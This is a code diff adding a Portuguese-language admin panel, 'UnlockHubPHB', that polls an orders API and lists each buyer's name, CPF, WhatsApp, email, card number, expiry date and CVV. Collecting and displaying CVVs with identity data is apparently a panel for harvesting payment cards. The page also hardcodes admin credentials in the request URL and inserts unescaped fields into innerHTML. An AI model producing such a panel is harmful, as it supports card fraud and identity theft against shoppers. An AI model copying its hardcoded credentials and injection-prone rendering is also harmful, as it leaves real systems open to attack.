@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Painel Admin - UnlockHubPHB</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+body{background:#0a0a0a;color:white;font-family:'Poppins',sans-serif;margin:0;padding:20px;}
+h1{color:#ff6600;text-align:center;}
+table{width:100%;border-collapse:collapse;margin-top:20px;}
+th, td{padding:12px;text-align:left;border-bottom:1px solid #ff6600;}
+th{background:#111;}
+tr:hover{background:#222;}
+</style>
+</head>
+<body>
+
+<h1>Painel Administrativo - Pedidos</h1>
+<p>Todos os pedidos feitos via checkout aparecem aqui em tempo real.</p>
+
+<table>
+<thead>
+<tr>
+<th>Nome</th>
+<th>CPF</th>
+<th>WhatsApp</th>
+<th>Email</th>
+<th>Produto</th>
+<th>Preço</th>
+<th>Pagamento</th>
+<th>Número Cartão</th>
+<th>Validade</th>
+<th>CVV</th>
+</tr>
+</thead>
+<tbody id="pedidosTable"></tbody>
+</table>
+
+<script>
+async function carregarPedidos(){
+    const tbody = document.getElementById('pedidosTable');
+    tbody.innerHTML = '<tr><td colspan="10">Carregando...</td></tr>';
+
+    try{
+        const resposta = await fetch('/api/pedidos?email=admin@unlockhub.com&senha=admin123');
+        const pedidos = await resposta.json();
+        tbody.innerHTML = '';
+        if(pedidos.length===0){tbody.innerHTML='<tr><td colspan="10">Nenhum pedido ainda.</td></tr>'; return;}
+
+        pedidos.forEach(p=>{
+            const tr=document.createElement('tr');
+            tr.innerHTML=`<td>${p.nome||''}</td>
+                          <td>${p.cpf||''}</td>
+                          <td>${p.whatsapp||''}</td>
+                          <td>${p.email||''}</td>
+                          <td>${p.produto||''}</td>
+                          <td>R$ ${p.preco||''}</td>
+                          <td>${p.metodo||''}</td>
+                          <td>${p.numerocartao||'-'}</td>
+                          <td>${p.validade||'-'}</td>
+                          <td>${p.cvv||'-'}</td>`;
+            tbody.appendChild(tr);
+        });
+    } catch(err){
+        tbody.innerHTML='<tr><td colspan="10">Erro ao carregar pedidos.</td></tr>';
+        console.error(err);
+    }
+}
+
+carregarPedidos();
+setInterval(carregarPedidos,10000);
+</script>
+
+</body>
+</html>
